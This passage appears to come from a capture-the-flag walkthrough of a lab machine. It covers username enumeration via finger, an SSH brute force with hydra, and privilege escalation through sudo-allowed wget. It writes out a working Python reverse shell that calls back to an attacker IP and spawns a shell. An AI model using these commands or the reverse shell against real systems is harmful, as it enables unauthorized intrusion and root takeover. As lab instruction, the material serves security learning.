> Some more searching leads me to a Perl script we can use to enumerate usernames. We'll download it using wget.

> ```bash
> wget https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl
> ```
>
> ![](https://miro.medium.com/max/1400/1*hEoObsS7-7XbUjCqzxIJGw.png)
>
> ```bash
> # Usage: finger-user-enum.pl [options]
> #        ( -u username | -U file-of-usernames )
> #        ( -t host | -T file-of-targets )
> # Example:
> #        finger-user-enum.pl -U users.txt -t 10.0.0.1  
> finger-user-enum.pl -u root -t 10.0.0.1  
> finger-user-enum.pl -U users.txt -T ips.txt
> ```
>
> A quick `locate username` on my Kali machine pulls all the files containing the word username.
>
> ```bash
> locate username
> ```
>
> `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` sounds good to me with an advertised 10 million usernames!

> Using this file, our syntax in our working directory will be:
>
> ```bash
> perl finger-user-enum.pl -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.76 > userenum.txt
> ```
>
> The scripts output will append the results to a file named userenum.txt. (You do not have to do this, I just donâ€™t like to lose my results.)

> The output is a bit messy, but we have a few usernames to attempt a brute-force attack against port \[**22022/tcp open ssh SunSSH 1.3 (protocol 2.0)\]**
>
> The following usernames are the most interesting:
>
> ```bash
> sammy@10.10.10.76: sammy console <Jul 31 17:59>  
> sunny@10.10.10.76: sunny pts/3 <Apr 24, 2018>
> ```
>
> Use the following syntax to brute-force:
>
> ```bash
> hydra -V -f -t 4 -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022
> ```
>
> ![](https://miro.medium.com/max/1400/1*IVLkF60wYFaS2MiBDQwKSg.png)

> Habitually on Linux systems itâ€™s always a good idea to check if a low-privileged user has any sudo permissions.

> ```bash
> sudo -l

> Looks like Sammy can run wget as root without a password. With this, we can overwrite `/root/troll` with a reverse-shell and then run it as root with Sunny's user account.
>
> Copy and paste this Python reverse-shell to a file named `reverse.py` on the target machine.

> ```python
> #!/usr/bin/python
> import socket  
> import subprocess  
> import os
> 
> s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
> s.connect(("10.10.14.15",443))  
> os.dup2(s.fileno(),0)  
> os.dup2(s.fileno(),1)  
> os.dup2(s.fileno(),2)  
> p = subprocess.call(["/bin/sh","-i"])

> Host this file with an HTTP server using Python, but before you do â€” ensure to edit the parameters to your local IP/port to receive the shell (I like to use port 443.)

> On the victim machine: we're going to download the reverse shell to replace /root/troll (Sammy), and then run the reverse shell as root (Sunny). Hopefully sending a privileged reverse shell back to us.
